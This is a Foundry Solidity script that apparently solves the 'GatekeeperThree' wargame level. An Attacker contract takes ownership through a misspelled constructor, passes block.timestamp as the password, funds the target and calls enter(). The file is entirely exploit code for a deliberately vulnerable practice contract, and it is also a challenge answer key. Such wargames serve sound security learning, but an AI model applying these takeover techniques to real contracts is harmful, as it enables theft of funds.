// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {GatekeeperThree, SimpleTrick} from "../src/GatekeeperThree.sol";

contract Attacker {
    GatekeeperThree public target;

    constructor(address payable _target) payable {
        target = GatekeeperThree(_target);
    }

    function hack() external {
        target.construct0r();
        target.createTrick();
        target.getAllowance(block.timestamp);
        (bool success, ) = payable(address(target)).call{
            value: address(this).balance
        }("");
        require(success, "failed to send ether to target address");
        target.enter();
    }
}

contract SolveGatekeeperThree is Script {
    function run() public {
        vm.startBroadcast();

        GatekeeperThree gatekeeperThree = GatekeeperThree(
            payable(vm.envAddress("GATEKEEPERTHREE_ADDRESS"))
        );

        Attacker attacker = new Attacker{value: 0.0011 ether}(
            payable(address(gatekeeperThree))
        );

        attacker.hack();

        vm.stopBroadcast();
    }
}
